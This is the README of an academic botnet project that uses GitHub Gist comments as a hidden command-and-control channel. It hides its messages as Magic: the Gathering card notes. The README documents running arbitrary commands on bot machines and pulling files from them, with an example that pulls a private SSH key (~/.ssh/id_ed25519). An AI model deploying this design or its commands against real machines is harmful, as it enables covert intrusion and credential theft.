# GistBotnet

A simple botnet implementation using GitHub Gists as the communication channel.

The project is intended for academic purposes.
It was done as a part of the "Introduction to Security" course at FEE of CTU in Prague.

## Features

The botnet uses comments of a specified gist post as the communication channel.

The controller periodically checkd which bots are alive.

Any bash command can be executed on the bot machines using the controller. (Including execution of a binary file.)

A file can be sent from any bot to the controller.

The communication is 'steganized' to not look like bot communication and a (very basic) encryption is used.

All sent and received commands are logged in the `.controllog` and `.botlog` files.

## Message Steganization

The messages are steganized so it looks as if the comment section of the gist post was being used by the user as a list of good cards they found for their MtG decks.

The following process takes place to steganize each message:

- Randomly select one of the predefined MtG decks.

- Query scryfall.com for a random card which fits the given deck using predefined queries for each deck.

- Select a random 'human note' from a predefined list of notes.

- Base64 encode the secret message, encrypt it via the Vigenere cypher and url encode it.

- Construct the gist comment by combining the human note, deck name, card name and card link. Concatenate the encoded message to the card link with preceding `/#` so that the link works as normal.

This process ensures that the message does not look suspicous or bot-generated at the first glance and the encoded secret message is hidden in the link (which still works) and thus not immidiately suspicious.

Here is an example of how the communication channel can look: https://gist.github.com/Sheld5/d52ec4473ceeb711bf234f1e41ebc06a

## Basic Usage

### Configuration

The botnet has to be configured before usage by filling all fields in the `config.json` file.

`GIT_API_TOKEN`: Github access token to post comments on the gist. Create one at https://github.com/settings/tokens?type=beta. Give it the 'Read and Write access to gists' permission.

`GIST_ID`: The id of the gist used as the communication channel. Copy it from the gist url. (`https://gist.github.com/<USER>/<GIST_ID>`)

`STEG_KEY`: The key used for message encryption. Can contain letters (upper & lower case) and digits.

### Bot

- Run `python3.8 bot.py`. The bot will periodically check for any new commands from the controller and respond to them.

### Controller

- Run `python3.8 controller.py hb` in one terminal. This proccess will periodically send 'HEARTBEAT' messages to the bots to check which are alive and recieve all of their responses.

- Run `python3.8 controller.py cmd -d <command> -b <botid>` to request a bot to execute the given command.

## Commands

The list of all controller commands follows:

### heartbeat, hb

Periodically check which bots are alive and receive their responses.

Examples: `python3.8 controller.py heartbeat` `python3.8 controller.py hb`

### cmd, exec

Execute the given command or binary file. (The two options are equivalent.)

Examples: `python3.8 controller.py cmd -d ps` `python3.8 controller.py exec -d /path/to/bin`

### w, ls, id

Execute the according shell command. The same result can be achieved using the `cmd` command.

Examples: `python3.8 controller.py ls` is equivalent to `python3.8 controller.py cmd -d ls`

### sendfile, sf

Send the given file to the controller.

Examples: `python3.8 controller.py sf -d README.md` `python3.8 controller.py sf -d ~/.ssh/id_ed25519`

## Options

### --data, -d

Provide data if the command requires it.

### --bot, -b

Specifiy the id of the bot which is to execute the command. Defaults to `0` which is interpreted as BROADCAST and all bots will respond.

### --silent, -s

Make the controller print less output.

### --noresponse, -n

Tell the bot to not respond to this command and only execute it. (Only makes sense with some commands.)
